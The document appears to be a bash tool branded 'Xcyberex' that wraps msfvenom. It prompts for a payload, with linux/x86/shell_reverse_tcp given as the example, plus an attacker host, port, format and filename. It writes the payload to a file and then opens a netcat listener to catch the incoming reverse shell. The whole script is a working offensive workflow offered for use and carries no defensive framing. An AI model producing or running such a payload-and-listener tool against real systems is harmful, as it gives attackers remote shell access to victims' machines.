#!/usr/bin/env bash

if command -v figlet &> /dev/null; then
    figlet "Xcyberex"
elif command -v toilet &> /dev/null; then
    toilet "Xcyberex"
fi

if ! command -v msfvenom &> /dev/null; then
    echo "Error: 'msfvenom' is not installed." >&2
    exit 1
fi

if ! command -v nc &> /dev/null && ! command -v netcat &> /dev/null; then
    echo "Error: 'netcat' is not installed." >&2
    exit 1
fi

read -p "Enter Payload (e.g., linux/x86/shell_reverse_tcp): " PAYLOAD
read -p "Enter LHOST: " LHOST
read -p "Enter LPORT: " LPORT
read -p "Enter Output File Format (e.g., elf, raw, exe): " FORMAT
read -p "Enter Output Filename (e.g., shell.elf): " FILENAME

mkdir -p payload

OUTPUT_PATH="payload/${FILENAME}"

echo "Generating payload..."
msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -o "$OUTPUT_PATH"

if [[ $? -eq 0 && -f "$OUTPUT_PATH" ]]; then
    echo "Payload successfully saved to $OUTPUT_PATH"
    echo "Starting Netcat listener on port $LPORT..."
    echo "----------------------------------------"
    nc -lvnp "$LPORT"
else
    echo "Error: Failed to generate payload." >&2
    exit 1
fi